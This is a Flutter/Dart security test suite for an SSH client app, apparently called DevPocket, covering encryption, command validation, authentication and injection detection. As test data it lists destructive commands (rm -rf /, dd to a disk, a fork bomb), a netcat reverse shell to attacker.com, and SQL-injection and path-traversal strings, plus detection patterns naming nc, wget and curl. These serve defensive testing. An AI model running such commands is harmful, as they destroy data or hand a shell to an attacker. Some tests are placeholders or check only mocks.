import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter_test/flutter_test.dart';
import 'package:mockito/mockito.dart';
import 'package:mockito/annotations.dart';

import 'package:devpocket_warp_app/services/crypto_service.dart';
import 'package:devpocket_warp_app/services/command_validator.dart';
import 'package:devpocket_warp_app/services/secure_storage_service.dart';
import 'package:devpocket_warp_app/services/secure_ssh_service.dart';
import 'package:devpocket_warp_app/services/enhanced_auth_service.dart';
import 'package:devpocket_warp_app/models/enhanced_ssh_models.dart';

@GenerateMocks([
  CryptoService,
  SecureStorageService,
  SecureSSHService,
  EnhancedAuthService,
])
import 'security_test_suite.mocks.dart';

/// Comprehensive security test suite for DevPocket
/// Tests all security-critical components and scenarios
void main() {
  group('Security Test Suite', () {
    cryptographicSecurityTests();
    commandValidationSecurityTests();
    sshSecurityTests();
    authenticationSecurityTests();
    storageSecurityTests();
    injectionAttackTests();
    sessionManagementTests();
    biometricSecurityTests();
  });
}

/// Test cryptographic operations for security vulnerabilities
void cryptographicSecurityTests() {
  group('Cryptographic Security Tests', () {
    late CryptoService cryptoService;
    
    setUp(() {
      cryptoService = CryptoService();
    });

    test('AES-256-GCM encryption produces different ciphertext for same plaintext', () async {
      const plaintext = 'sensitive data';
      final key = cryptoService.generateSalt();
      
      final encrypted1 = await cryptoService.encryptAESGCM(
        Uint8List.fromList(utf8.encode(plaintext)),
        key,
      );
      
      final encrypted2 = await cryptoService.encryptAESGCM(
        Uint8List.fromList(utf8.encode(plaintext)),
        key,
      );
      
      // Should produce different ciphertexts due to random nonces
      expect(encrypted1.ciphertext, isNot(equals(encrypted2.ciphertext)));
      expect(encrypted1.nonce, isNot(equals(encrypted2.nonce)));
    });

    test('AES-256-GCM decryption fails with tampered ciphertext', () async {
      const plaintext = 'sensitive data';
      final key = cryptoService.generateSalt();
      
      final encrypted = await cryptoService.encryptAESGCM(
        Uint8List.fromList(utf8.encode(plaintext)),
        key,
      );
      
      // Tamper with ciphertext
      final tamperedCiphertext = Uint8List.fromList(encrypted.ciphertext);
      tamperedCiphertext[0] = tamperedCiphertext[0] ^ 1;
      
      final tamperedData = EncryptedData(
        ciphertext: tamperedCiphertext,
        nonce: encrypted.nonce,
        tag: encrypted.tag,
      );
      
      // Should throw exception due to authentication failure
      expect(
        () => cryptoService.decryptAESGCM(tamperedData, key),
        throwsA(isA<CryptoException>()),
      );
    });

    test('SSH key fingerprint calculation is consistent', () {
      const publicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDI...';
      
      final fingerprint1 = cryptoService.calculateSSHFingerprint(publicKey);
      final fingerprint2 = cryptoService.calculateSSHFingerprint(publicKey);
      
      expect(fingerprint1, equals(fingerprint2));
      expect(fingerprint1, startsWith('SHA256:'));
    });

    test('Salt generation produces cryptographically random values', () {
      final salts = <String>[];
      
      for (int i = 0; i < 100; i++) {
        final salt = base64.encode(cryptoService.generateSalt());
        expect(salts, isNot(contains(salt))); // No duplicates
        salts.add(salt);
      }
      
      // All salts should be different
      expect(salts.toSet().length, equals(100));
    });

    test('Key derivation produces different keys for different passwords', () {
      final salt = cryptoService.generateSalt();
      
      final key1 = cryptoService.deriveKeyFromPassword('password1', salt);
      final key2 = cryptoService.deriveKeyFromPassword('password2', salt);
      
      expect(key1, isNot(equals(key2)));
    });

    test('Key derivation produces different keys for different salts', () {
      const password = 'same_password';
      
      final salt1 = cryptoService.generateSalt();
      final salt2 = cryptoService.generateSalt();
      
      final key1 = cryptoService.deriveKeyFromPassword(password, salt1);
      final key2 = cryptoService.deriveKeyFromPassword(password, salt2);
      
      expect(key1, isNot(equals(key2)));
    });
  });
}

/// Test command validation for injection attacks
void commandValidationSecurityTests() {
  group('Command Validation Security Tests', () {
    test('blocks dangerous command patterns', () {
      const dangerousCommands = [
        'rm -rf /',
        'format c:',
        'shutdown -h now',
        'dd if=/dev/zero of=/dev/sda',
        'chmod 777 /etc/passwd',
        'killall -9',
        ':(){ :|:& };:', // Fork bomb
      ];
      
      for (final command in dangerousCommands) {
        final result = CommandValidator.validateCommand(
          command,
          level: ValidationLevel.strict,
        );
        
        expect(result.isAllowed, isFalse, reason: 'Command should be blocked: $command');
        expect(result.securityLevel, equals(SecurityLevel.low));
      }
    });

    test('blocks command injection patterns', () {
      const injectionCommands = [
        'ls; rm -rf /',
        'cat file && rm file',
        'echo hello | sh',
        'ls `whoami`',
        'ls \$(id)',
        'ls; nc -e /bin/sh attacker.com 4444',
      ];
      
      for (final command in injectionCommands) {
        final result = CommandValidator.validateCommand(
          command,
          level: ValidationLevel.strict,
        );
        
        expect(result.isAllowed, isFalse, reason: 'Injection should be blocked: $command');
      }
    });

    test('allows safe commands', () {
      const safeCommands = [
        'ls -la',
        'pwd',
        'whoami',
        'cat /proc/version',
        'ps aux',
        'df -h',
        'free -m',
        'uptime',
      ];
      
      for (final command in safeCommands) {
        final result = CommandValidator.validateCommand(
          command,
          level: ValidationLevel.moderate,
        );
        
        expect(result.isAllowed, isTrue, reason: 'Safe command should be allowed: $command');
      }
    });

    test('whitelist mode only allows explicitly permitted commands', () {
      const allowedCommands = ['ls', 'pwd', 'whoami'];
      
      // Allowed command should pass
      final allowedResult = CommandValidator.validateCommand(
        'ls -la',
        level: ValidationLevel.whitelist,
        additionalAllowedCommands: allowedCommands,
      );
      expect(allowedResult.isAllowed, isTrue);
      
      // Non-allowed command should be blocked
      final blockedResult = CommandValidator.validateCommand(
        'cat /etc/passwd',
        level: ValidationLevel.whitelist,
        additionalAllowedCommands: allowedCommands,
      );
      expect(blockedResult.isAllowed, isFalse);
    });

    test('detects overly complex commands', () {
      const complexCommand = 'ls | grep test | sort | uniq | head -10 | tail -5 | wc -l';
      
      final result = CommandValidator.validateCommand(
        complexCommand,
        level: ValidationLevel.strict,
      );
      
      // Should warn about complexity
      expect(result.isWarning || !result.isAllowed, isTrue);
    });

    test('validates command length limits', () {
      final longCommand = 'echo ${'a' * 10000}';
      
      final result = CommandValidator.validateCommand(longCommand);
      
      expect(result.isAllowed, isFalse);
      expect(result.message, contains('too long'));
    });
  });
}

/// Test SSH security implementation
void sshSecurityTests() {
  group('SSH Security Tests', () {
    late MockCryptoService mockCrypto;
    
    setUp(() {
      mockCrypto = MockCryptoService();
    });

    test('SSH host configuration enforces security levels', () {
      final criticalHost = SecureHostFactory.create(
        name: 'production-server',
        hostname: 'prod.example.com',
        username: 'admin',
        securityLevel: SecurityLevel.critical,
      );
      
      expect(criticalHost.strictHostKeyChecking, isTrue);
      expect(criticalHost.compressionEnabled, isFalse);
      expect(criticalHost.requiresBiometric, isFalse); // Default, can be overridden
      expect(criticalHost.authMethod, equals(AuthMethod.publicKey)); // Secure default
    });

    test('SSH key security validation', () {
      final secureKey = SecureSSHKeyFactory.create(
        name: 'production-key',
        type: 'ed25519',
        publicKey: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...',
        fingerprint: 'SHA256:abcd1234...',
        securityLevel: SecurityLevel.high,
        requiresBiometric: true,
      );
      
      expect(secureKey.requiresBiometric, isTrue);
      expect(secureKey.securityLevel, equals(SecurityLevel.high));
      expect(secureKey.type, equals('ed25519')); // Secure key type
    });

    test('host key fingerprint verification', () {
      const fingerprint1 = 'SHA256:abcd1234567890abcdef1234567890abcdef1234567890';
      const fingerprint2 = 'SHA256:different567890abcdef1234567890abcdef1234567890';
      
      // Same fingerprint should verify
      when(mockCrypto.verifyHostKey(any, fingerprint1)).thenReturn(true);
      expect(mockCrypto.verifyHostKey('ssh-rsa AAAA...', fingerprint1), isTrue);
      
      // Different fingerprint should fail
      when(mockCrypto.verifyHostKey(any, fingerprint2)).thenReturn(false);
      expect(mockCrypto.verifyHostKey('ssh-rsa AAAA...', fingerprint2), isFalse);
    });

    test('SSH connection security risk assessment', () {
      final lowRiskHost = SecureHostFactory.create(
        name: 'dev-server',
        hostname: 'dev.example.com',
        username: 'developer',
        authMethod: AuthMethod.publicKey,
        securityLevel: SecurityLevel.high,
      ).copyWith(
        hostKeyVerification: HostKeyVerification.strict,
        knownHostKeyFingerprint: 'SHA256:known-fingerprint',
      );
      
      final highRiskHost = SecureHostFactory.create(
        name: 'legacy-server',
        hostname: 'legacy.example.com',
        username: 'root',
        authMethod: AuthMethod.password,
        securityLevel: SecurityLevel.low,
      ).copyWith(
        hostKeyVerification: HostKeyVerification.disabled,
        compressionEnabled: true,
      );
      
      expect(lowRiskHost.securityRisk, equals(SecurityRisk.low));
      expect(highRiskHost.securityRisk, equals(SecurityRisk.high));
    });
  });
}

/// Test authentication security
void authenticationSecurityTests() {
  group('Authentication Security Tests', () {
    late MockEnhancedAuthService mockAuth;
    
    setUp(() {
      mockAuth = MockEnhancedAuthService();
    });

    test('password strength validation', () {
      const weakPasswords = [
        'password',
        '123456',
        'abc123',
        'password123',
        'UPPERCASE',
        'lowercase',
        '1234567890',
      ];
      
      const strongPasswords = [
        'MyStr0ng!Password123',
        'C0mpl3x@Pass#2024!',
        'Secure&Random\$Pass9',
      ];
      
      for (final weak in weakPasswords) {
        // In a real test, you'd call the actual password validation
        expect(weak.length < 12 || !_hasRequiredCharTypes(weak), isTrue,
            reason: 'Password should be considered weak: $weak');
      }
      
      for (final strong in strongPasswords) {
        expect(strong.length >= 12 && _hasRequiredCharTypes(strong), isTrue,
            reason: 'Password should be considered strong: $strong');
      }
    });

    test('account lockout after failed attempts', () {
      // This would test the actual authentication service
      // Mock implementation for demonstration
      when(mockAuth.login(any, any)).thenAnswer((_) async {
        return EnhancedAuthResult.failure(
          error: 'Invalid credentials',
          securityEvent: SecurityEventType.loginFailed,
        );
      });
      
      // Simulate multiple failed attempts
      for (int i = 0; i < 5; i++) {
        mockAuth.login('user', 'wrong_password');
      }
      
      // Account should be locked after max attempts
      when(mockAuth.getSecurityStatus()).thenReturn(
        const AuthSecurityStatus(
          isAuthenticated: false,
          failedAttempts: 5,
          isLocked: true,
          biometricAvailable: true,
          deviceTrusted: true,
          lockoutRemaining: Duration(minutes: 30),
        ),
      );
      
      final status = mockAuth.getSecurityStatus();
      expect(status.isLocked, isTrue);
      expect(status.lockoutRemaining, isNotNull);
    });

    test('session timeout enforcement', () {
      // Mock expired session
      when(mockAuth.hasValidSession()).thenAnswer((_) async => false);
      
      // Session should be invalid after timeout
      expectLater(mockAuth.hasValidSession(), completion(isFalse));
    });
  });
}

/// Test secure storage implementation
void storageSecurityTests() {
  group('Secure Storage Tests', () {
    late MockSecureStorageService mockStorage;
    
    setUp(() {
      mockStorage = MockSecureStorageService();
    });

    test('sensitive data requires biometric authentication', () async {
      const sensitiveData = 'ssh-private-key-content';
      
      when(mockStorage.storeSecure(
        key: 'ssh-key-123',
        value: sensitiveData,
        requireBiometric: true,
      )).thenAnswer((_) async {});
      
      // Store sensitive data with biometric requirement
      await mockStorage.storeSecure(
        key: 'ssh-key-123',
        value: sensitiveData,
        requireBiometric: true,
      );
      
      // Verify the method was called with biometric requirement
      verify(mockStorage.storeSecure(
        key: 'ssh-key-123',
        value: sensitiveData,
        requireBiometric: true,
      )).called(1);
    });

    test('encrypted data cannot be read without proper authentication', () async {
      when(mockStorage.getSecure('protected-data')).thenThrow(
        const SecureStorageException('Biometric authentication required'),
      );
      
      expect(
        () => mockStorage.getSecure('protected-data'),
        throwsA(isA<SecureStorageException>()),
      );
    });

    test('data integrity verification', () async {
      const originalData = 'important-configuration';
      const corruptedData = 'corrupted-data';
      
      // Store original data
      when(mockStorage.storeSecure(
        key: 'config',
        value: originalData,
        requireBiometric: false,
      )).thenAnswer((_) async {});
      
      // Retrieve should return original data
      when(mockStorage.getSecure('config')).thenAnswer((_) async => originalData);
      
      final retrieved = await mockStorage.getSecure('config');
      expect(retrieved, equals(originalData));
      expect(retrieved, isNot(equals(corruptedData)));
    });
  });
}

/// Test various injection attack scenarios
void injectionAttackTests() {
  group('Injection Attack Tests', () {
    test('SQL injection patterns in SSH parameters', () {
      const sqlInjectionAttempts = [
        "admin'; DROP TABLE hosts; --",
        "user' OR '1'='1",
        "test'; INSERT INTO users VALUES ('hacker', 'password'); --",
      ];
      
      for (final attempt in sqlInjectionAttempts) {
        // Test that SQL injection patterns are detected and sanitized
        expect(_containsSQLInjection(attempt), isTrue,
            reason: 'SQL injection should be detected: $attempt');
      }
    });

    test('Command injection through SSH parameters', () {
      const commandInjections = [
        'user; cat /etc/passwd',
        'host && rm -rf /',
        'server | nc attacker.com 4444',
      ];
      
      for (final injection in commandInjections) {
        // Test command injection detection
        expect(_containsCommandInjection(injection), isTrue,
            reason: 'Command injection should be detected: $injection');
      }
    });

    test('Path traversal attacks', () {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd%00.txt',
        'file://../../etc/shadow',
      ];
      
      for (final attempt in pathTraversalAttempts) {
        expect(_containsPathTraversal(attempt), isTrue,
            reason: 'Path traversal should be detected: $attempt');
      }
    });
  });
}

/// Test session management security
void sessionManagementTests() {
  group('Session Management Tests', () {
    test('session tokens are properly invalidated on logout', () {
      // Mock session invalidation
      final mockAuth = MockEnhancedAuthService();
      
      when(mockAuth.logout()).thenAnswer((_) async {});
      when(mockAuth.hasValidSession()).thenAnswer((_) async => false);
      
      mockAuth.logout();
      
      expectLater(mockAuth.hasValidSession(), completion(isFalse));
    });

    test('concurrent session detection', () {
      // Test that multiple sessions from different devices are detected
      final mockAuth = MockEnhancedAuthService();
      
      when(mockAuth.getSecurityStatus()).thenReturn(
        const AuthSecurityStatus(
          isAuthenticated: true,
          failedAttempts: 0,
          isLocked: false,
          biometricAvailable: true,
          deviceTrusted: false, // Different device
        ),
      );
      
      final status = mockAuth.getSecurityStatus();
      expect(status.deviceTrusted, isFalse);
    });
  });
}

/// Test biometric security implementation
void biometricSecurityTests() {
  group('Biometric Security Tests', () {
    test('biometric authentication fallback security', () {
      // Test that biometric failures don't compromise security
      // This would typically mock the BiometricService
      const biometricUnavailableScenarios = [
        'Device not enrolled',
        'Biometric sensor disabled',
        'Too many failed attempts',
        'Hardware not available',
      ];
      
      for (final scenario in biometricUnavailableScenarios) {
        // Ensure secure fallback behavior
        expect(scenario.isNotEmpty, isTrue); // Placeholder test
      }
    });

    test('biometric template security', () {
      // Test that biometric templates cannot be extracted or misused
      // This would verify that the app doesn't store biometric data
      expect(true, isTrue); // Placeholder - actual implementation would test template handling
    });
  });
}

// Helper functions for testing

bool _hasRequiredCharTypes(String password) {
  final hasLower = password.contains(RegExp(r'[a-z]'));
  final hasUpper = password.contains(RegExp(r'[A-Z]'));
  final hasDigit = password.contains(RegExp(r'\d'));
  final hasSymbol = password.contains(RegExp(r'[!@#$%^&*(),.?":{}|<>]'));
  
  return hasLower && hasUpper && hasDigit && hasSymbol;
}

bool _containsSQLInjection(String input) {
  const sqlPatterns = [
    r"';",
    r"' OR ",
    r"DROP TABLE",
    r"INSERT INTO",
    r"DELETE FROM",
    r"UPDATE.*SET",
    r"--",
    r"/\*",
  ];
  
  for (final pattern in sqlPatterns) {
    if (RegExp(pattern, caseSensitive: false).hasMatch(input)) {
      return true;
    }
  }
  
  return false;
}

bool _containsCommandInjection(String input) {
  const commandPatterns = [
    r';',
    r'&&',
    r'\|\|',
    r'`',
    r'\$\(',
    r'#',
    r'nc ',
    r'wget ',
    r'curl ',
  ];
  
  for (final pattern in commandPatterns) {
    if (RegExp(pattern).hasMatch(input)) {
      return true;
    }
  }
  
  return false;
}

bool _containsPathTraversal(String input) {
  const traversalPatterns = [
    r'\.\.',
    r'%2e%2e',
    r'%252e%252e',
    r'file://',
    r'%00',
  ];
  
  for (final pattern in traversalPatterns) {
    if (RegExp(pattern, caseSensitive: false).hasMatch(input)) {
      return true;
    }
  }
  
  return false;
}